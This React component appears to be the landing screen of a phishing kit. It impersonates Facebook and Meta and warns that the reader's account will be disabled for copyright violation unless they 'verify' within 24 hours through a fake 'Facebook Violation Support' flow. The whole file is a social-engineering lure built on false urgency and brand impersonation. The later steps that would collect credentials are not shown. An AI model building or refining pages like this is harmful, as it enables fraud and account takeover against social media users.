import { Button } from '@/components/ui/button';

interface LandingPageProps {
  onGetStarted: () => void;
}

export default function LandingPage({ onGetStarted }: LandingPageProps) {
  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-lg shadow-lg overflow-hidden">
        {/* Facebook Logo */}
        <div className="text-center py-6 px-6">
          <div className="w-16 h-16 bg-facebook-blue rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-white font-bold text-2xl">f</span>
          </div>
        </div>

        {/* Main Content */}
        <div className="px-6 pb-6">
          <div className="text-center mb-6">
            <h3 className="text-xl font-semibold text-facebook-text mb-4">
              Account will be deactivated
            </h3>
            
            <div className="space-y-4 text-sm text-facebook-text">
              <p>
                Your account or the page you use has violated copyright. We will 
                immediately limit your account or permanently disable it for 
                non-compliance with our terms of service.
              </p>
              
              <p>
                If you think we've accidentally suspended your account, you have 24 hours 
                to verify your account. If you miss this security notification, your 
                account will be permanently disabled.
              </p>
            </div>
          </div>

          {/* Support Section */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex items-center space-x-3">
              <div className="w-12 h-12 bg-facebook-blue rounded-full flex items-center justify-center">
                <span className="text-white font-bold text-lg">f</span>
              </div>
              <div>
                <div className="font-semibold text-facebook-blue text-sm">
                  Facebook Violation Support
                </div>
              </div>
            </div>
          </div>

          <div className="text-center mb-6">
            <p className="text-sm text-facebook-secondary">
              We will walk you through several steps to cancel a deactivated account.
            </p>
          </div>

          {/* Get Started Button */}
          <Button
            onClick={onGetStarted}
            className="w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-3 px-4 rounded-md text-base font-medium transition-colors"
          >
            Get Started
          </Button>
        </div>

        {/* Footer */}
        <div className="text-center py-4 text-xs text-facebook-secondary border-t border-facebook-border">
          Meta © 2025
        </div>
      </div>
    </div>
  );
}